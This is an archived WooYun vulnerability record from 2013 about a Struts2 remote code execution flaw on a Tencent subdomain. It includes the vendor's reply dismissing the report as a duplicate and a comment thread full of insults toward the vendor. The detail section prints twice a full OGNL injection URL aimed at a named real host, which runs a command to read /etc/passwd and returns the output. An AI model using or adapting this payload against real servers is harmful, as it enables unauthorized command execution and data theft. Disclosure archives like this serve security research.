{"id": 11404, "wybug_id": "wooyun-2013-029391", "wybug_title": "腾讯某站存在struts2远程代码执行漏洞", "wybug_corp": "腾讯", "wybug_author": "小博", "wybug_date": "2013-07-17 16:34", "wybug_open_date": "2013-07-18 16:03", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  http://act.sj.qq.com/bless/blog.do?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}   漏洞证明：  http://act.sj.qq.com/bless/blog.do?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{%27cat%27,%27/etc/passwd%27}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}\n\n   修复方案：     版权声明：转载请注明来源 小博@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-07-18 16:03 厂商回复： 我们在17号上午就已经接到大量报告，获悉到这个情况，因此这里忽略。依然感谢你的报告。 最新状态： 2013-07-19：各位大牛，不要激动。 腾讯并未高高在上，我们是基于这样的考虑才做出忽略的决定：这个漏洞前后共计10+的人都向我们报告过，我们的处理原则是对所有报告者表示感谢，但只对首发报告者给分。 我们也已经与洞主沟通过，提出忽略的原因，洞主表示“无所谓”。 这里也暴露出了我们在处理时的一些问题，一个是当时重复的漏洞报告特别多（100+），人力有限，我们无法一一答复；二个是wooyun平台上提供的厂商与白帽子沟通渠道并不及时（私信方式，无法保证及时性。各位大牛是否有同感？），本次也是通过QQ及时联系到洞主，建议wooyun提供一键QQ联系的方式。以上问题我们会改进。 非常感谢各位大牛的批评与建议，有任何问题都可以提出。另外，请理智发言,文明上网。  ", "replys": "漏洞评价：\n评论\n     2013-07-18 16:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  傻逼腾讯，你受到报告关乌云什么事情， 反正当时是没修复的    \n     2013-07-18 16:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 16:28 |    \t\t無情 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 根据相关法律法规和政策，此信息未予显示。)\t\t \n  瓜子    \n     2013-07-18 16:28 |    \t\tdarksn0w \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 无折腾,不生活！)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 16:28 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  啤酒    \n     2013-07-18 16:28 |    \t\tsinck \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 1)\t\t \n  占座    \n     2013-07-18 16:29 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 16:29 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  前排求贱心签名照!    \n     2013-07-18 16:29 |    \t\tz7y \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:9        | 关注技术与网络安全)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 16:29 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 16:29 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  专门从群里赶来围观，前排出售花生米    \n     2013-07-18 16:29 |    \t\tYangG \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 没)\t\t \n  傻逼玩意，高高在上的     \n     2013-07-18 16:30 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  哟西    \n     2013-07-18 16:31 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  专门来出手瓜子，花生啤酒矿泉水    \n     2013-07-18 16:32 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @xsser 收到没收到谁知道。。当时修没修，大家都知道。。    \n     2013-07-18 16:36 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  专门从群里赶来围观，后排出售烤串啤酒    \n     2013-07-18 16:40 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  剑心号被盗了    \n     2013-07-18 17:05 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 17:06 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 17:26 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 17:27 |    \t\t自在轮回 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | .)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 17:40 |    \t\tasgoo \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 虚心学习)\t\t \n  今天我发现好多人的号被逼下线 包括我的520XX 别搞我号啊。。。    \n     2013-07-18 18:08 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-18 20:15 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  XSSER怒了    \n     2013-07-18 21:25 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  傻逼骂傻逼     \n     2013-07-18 21:36 |    \t\t纠结师 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:12        | 传说中的废材)\t\t \n  去你妈的腾讯 高高在上的样子 有洞子 头抬那么高干叼? 装看不到?    \n     2013-07-18 21:46 |    \t\t小囧 \t\t\t( 普通白帽子  |\t\t\t        Rank:396 漏洞数:62        | 在通往牛B的路上一路狂奔)\t\t \n  这个确实处理不当~    \n     2013-07-18 22:09 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  这种struts2暴发型漏洞真没营养。。建议直接1rank，1个月后公开。。    \n     2013-07-18 23:42 |    \t\t天行健 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 业余信息安全爱好者，没事了玩一玩)\t\t \n  药店碧莲，@腾讯    \n     2013-07-19 09:47 |    \t\t许仙 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 技术需要时间沉淀)\t\t \n  傻逼玩意，高高在上的    \n     2013-07-19 11:22 |    \t\t腾讯(乌云厂商)\t\t \n  各位大牛，不要激动。腾讯并未高高在上，我们是基于这样的考虑才做出忽略的决定：这个漏洞前后共计10+的人都向我们报告过，我们的处理原则是对所有报告者表示感谢，但只对首发报告者给分。我们也已经与洞主沟通过，提出忽略的原因，洞主表示“无所谓”。这里也暴露出了我们在处理时的一些问题，一个是当时重复的漏洞报告特别多（100+），人力有限，我们无法一一答复；二个是wooyun平台上提供的厂商与白帽子沟通渠道并不及时（私信方式，无法保证及时性。各位大牛是否有同感？），本次也是通过QQ及时联系到洞主，建议wooyun提供一键QQ联系的方式。以上问题我们会改进。非常感谢各位大牛的批评与建议，有任何问题都可以提出。另外，请理智发言,文明上网。    \n     2013-07-19 11:26 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 11:47 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 12:09 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @xsser 提供qq接口    \n     2013-07-19 12:09 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 12:37 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 13:22 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 14:49 |    \t\t霸气帝王攻 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 专注互联网)\t\t \n  傻逼腾讯，你受到报告关乌云什么事情， 反正当时是没修复的    \n     2013-07-19 20:58 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  根据相关法律法规，此条发言未予显示。     \n     2013-07-19 23:34 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  根据相关法律法规，此条发言未予显示。    \n     2013-07-19 23:42 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  根据相关法律法规，此处发言未予显示玩意，高高在上的    \n     2013-07-21 01:36 |    \t\t微尘 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:74        )\t\t \n  根据相关法律法规，此处发言未予显示玩意的傻逼玩意，高高在上的    \n     2013-07-21 13:45 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  根据相关法律法规，此处发言未予显示玩意，高高在上的    \n     2013-08-03 11:05 |    \t\tby:安全者 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 只做安全者，不做入侵者！)\t\t \n  腾讯傻逼，ＱＱ空间可以ＸＳＳ了大家尽情发挥吧！暂时不透露未过滤处    \n     2013-09-21 13:48 |    \t\tSura、Rain \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 关注Java WEB安全)\t\t \n   傻逼吧你，从来就没觉得腾讯高高在上，太自以为是了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}